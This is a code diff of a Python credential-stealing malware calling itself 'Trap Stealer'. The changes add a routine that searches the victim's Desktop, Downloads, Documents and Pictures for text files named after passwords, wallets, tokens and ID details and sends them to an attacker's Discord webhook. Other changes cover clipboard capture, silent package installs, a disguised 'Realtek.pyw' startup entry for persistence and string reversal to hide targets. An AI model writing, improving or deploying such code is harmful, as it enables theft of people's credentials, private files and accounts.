@@ -1,5 +1,5 @@
 # Import dont mind
-import os, base64
+import os, base64, sys
 from os import getenv, startfile
 import threading
 from sys import executable
@@ -13,18 +13,14 @@ import time
 from zipfile import ZipFile
 import subprocess
 import socket, getpass, ctypes
-from PIL import ImageGrab
 import platform
 from shutil import copy
 from os.path import isfile
 import winreg, random
 from sqlite3 import connect as sql_connect
-import requests
 from base64 import b64decode
-from Crypto.Cipher import AES
 import os.path, zipfile
 import shutil, json
-import win32clipboard
 ### CONFIG ### 
 
 webhook = '' #Put ur webhook
@@ -172,9 +168,28 @@ def webhook_tools():
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"],
+    ["win32clipboard", "pywin32"],
+]
 
+for modl in requirements:
+    try:
+        __import__(modl[0])
+    except ImportError:
+        subprocess.Popen(
+            [sys.executable, "-m", "pip", "install", modl[1]],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        time.sleep(3)
+
+import requests
+from PIL import ImageGrab
 from ctypes import *
 from Crypto.Cipher import AES
+import win32clipboard
 
 
 class DATA_BLOB(Structure):
@@ -249,16 +264,14 @@ def DecryptValue(buff, master_key=None):
     
 
 def Clipboard():
-    win32clipboard.OpenClipboard()
-    clipboard_data = win32clipboard.GetClipboardData()
-    win32clipboard.CloseClipboard()
+    try:
+        win32clipboard.OpenClipboard()
+        clipboard_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
 
-    return clipboard_data
-
-try:
-    clipboardtext = Clipboard()
-except:
-    pass
+        return clipboard_data
+    except:
+        pass
 
 path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
@@ -296,18 +309,6 @@ def LoadUrlib(hook, data='', files='', headers=''):
                 return r
         except: 
             pass
-
-requirements = [
-    ["requests", "requests"],["Crypto.Cipher", "pycryptodome"]
-]
-
-import requests
-
-for modl in requirements:
-    try: __import__(modl[0])
-    except:
-        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-        time.sleep(3)
 
 Dscptb= 'BTPdrocsiD'[::-1];Dsccana = 'yranaCdrocsiD'[::-1]
 Dscdev = 'tnempoleveDdrocsiD'[::-1]
@@ -723,6 +724,7 @@ def getinfo():
     try:
         sysinfo = systemInfo()
         globalinfo = globalInfo()
+        clipboardtext = Clipboard()
         data = {
             
             "username": "Trap Stealer",
@@ -788,106 +790,67 @@ def steam_st():
     except:pass
 
 
-keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
-extension = ".txt"
+import os
+import concurrent.futures
+from json import dumps
 
+def upload_files_to_discord():
+    keywords = ["drowssap", "tellaw", "essap_edotom", "pdm", "essapedotom", "noken", "yek", "terces", "tterces", "ipa", "tnuocca", "nogin", "emusern", "liame", "enohp", "dircet tihcrac", "ytiruces yrtnuoces laicos", "sserdda", "etisoppa", "NIP", "trossap", "eciffo laicion", "dnocesorp", "tnuocca knalb", "gnitirw", "ytocryptocurrency", "niotcib", "muhtyre", "etelpmoc", "evig", "noitartsinimda"]
+    extension = 'txt'
 
-def filing():
-    try:
-        import concurrent.futures
+    desktop_path = os.path.expanduser("~/Desktop")
+    downloads_path = os.path.expanduser("~/Downloads")
+    documents_path = os.path.expanduser("~/Documents")
+    pictures_path = os.path.expanduser("~/Pictures")
 
-        file_paths = []
+    file_paths = []
 
-        for path in [desktop_path, downloads_path, documents_path, pictures_path]:
-            for file in os.listdir(path):
-                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                        file_path = os.path.join(path, file) 
-                        file_paths.append(file_path)
+    for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+        for file in os.listdir(path):
+             if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                    file_path = os.path.join(path, file) 
+                    file_paths.append(file_path)
 
+    urls = []
 
-        urls = []
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = []
+        for file_path in file_paths:
+            futures.append(executor.submit(upload_file, file_path))
+        for future, file_path in zip(futures, file_paths):
+            url = future.result()
+            if url:
+                urls.append((os.path.basename(file_path), url))
+            else:
+                pass
 
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            futures = []
-            for file_path in file_paths:
-                futures.append(executor.submit(upload_file, file_path))
-            for future, file_path in zip(futures, file_paths):
-                url = future.result()
-                if url:
-                    urls.append((os.path.basename(file_path), url))
-                else:
-                    pass
-
-
-
-        if urls:
-            embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
-
-            data = {
-                "username": "Trap Stealer",
-                "content": "",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                "embeds": [
-                    {
-                        "title": "🍪 Trap Stealer Files",
-                        "description": "New files have been uploaded:",
-                        "color": 0xffb6c1,
-                        "fields": embed_fields,
-                        "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                        },
-                        "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                        }
-                    }
-                ]
-            }
-
-        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:
-        pass
-
-def screens():
-    try:
-        user = os.path.expanduser("~")
-        img = ImageGrab.grab()
-        img_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
-        img.save(img_path)
-        file = {"file": open(img_path, "rb")}
+    if urls:
+        embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
 
         data = {
             "username": "Trap Stealer",
-            "content": "Screen was successfully taken",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🍪 Trap Stealer Files",
+                    "description": "New files have been uploaded:",
+                    "color": 0xffb6c1,
+                    "fields": embed_fields,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
         }
 
-        response = requests.post(webhook, files=file, data=data)
-        try:
-            os.remove(img_path)
-        except:
-            pass
-    except:
-        data = {
-        "username": "Trap Stealer",
-        "content": "",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-        "embeds": [
-            {
-                "title": "🍪 Trap Stealer Screen",
-                "description": f"Cannot take any screen\n",
-                "color": 0xffb6c1,
-                "thumbnail": {
-                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                },
-                "footer": {
-                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                }
-            }
-        ]
-    }
-    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+
 
 
 def Camera_get():
@@ -981,7 +944,12 @@ def GatherAll():
         [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
         [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
+    
     Threadlist = []
+    az = threading.Thread(target=upload_files_to_discord)
+    az.start()
+    Threadlist.append(az)
+
     a = threading.Thread(target=getinfo)
     a.start()
     Threadlist.append(a)
@@ -1000,17 +968,10 @@ def GatherAll():
         pa.start()
         threadlist2.append(pa)
 
-    fi = threading.Thread(target=filing)
-    fi.start()
-    Threadlist.append(fi)
-
-    scr = threading.Thread(target=screens)
-    scr.start()
-    Threadlist.append(scr)
-
     for thread in threadlist2:
         thread.join()
-    
+
+
     paz = threading.Thread(target=paaz)
     paz.start()
     Threadlist.append(paz)
